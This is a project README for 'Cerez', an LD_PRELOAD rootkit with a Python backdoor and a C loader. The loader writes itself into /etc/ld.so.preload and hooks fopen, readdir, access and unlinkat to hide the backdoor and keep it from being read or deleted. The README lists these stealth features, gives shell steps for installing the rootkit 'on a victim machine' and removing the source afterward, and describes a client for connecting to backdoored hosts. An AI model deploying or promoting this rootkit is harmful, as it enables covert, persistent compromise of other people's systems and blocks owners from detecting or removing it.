<h1 align="center">
  <img src="assets/banner.png"/>  
  <br>
  Cerez 😈 A simple LD_PRELOAD rootkit
</h1>

Cerez is a LD_PRELOAD rootkit, it consists of two parts, a backdoor 
(written in python) and a loader (written in c). Loader is a SO binary
that gets installed into `/lib` and writes its path into `/etc/ld.so.preload`,
this way every binary on the system preloads it.
By overwriting system functions like `fopen`, `readdir`, `access` and
`unlinkat` it makes it nearly impossible to remove/detect the backdoor.
I also wrote a simple client that you can use to connect the backdoor.

## Features
- ✔ Hidden in the process list
- ✔ Hidden in the file system
- ✔ Unreadable
- ✔ Undeleteable
- ✔ Unwriteable
- ❌ Hidden in the network list (WIP)

## Installing the rootkit
To install the rootkit on a victim machine:
```
git clone https://github.com/ngn13/cerez.git
cd cerez
chmod +x install.sh
# before installing see the backdoor.py
# and change the backdoor password
./install.sh
cd ..
rm -rf cerez
```

## Installing the client
To install the client that you can use to connect a
backdoored machine:
```
git clone https://github.com/ngn13/cerez.git
cd cerez
chmod +x client.py
./client.py
```

## Resources
To learn more about LD_PRELOAD rootkits, I highly recommend you read [this
article](https://compilepeace.medium.com/memory-malware-part-0x2-writing-userland-rootkits-via-ld-preload-30121c8343d5).
I also left some comments in the [loader.c](loader.c) so you can go ahead and read it.
You can also create an issue/PR if you are interested.
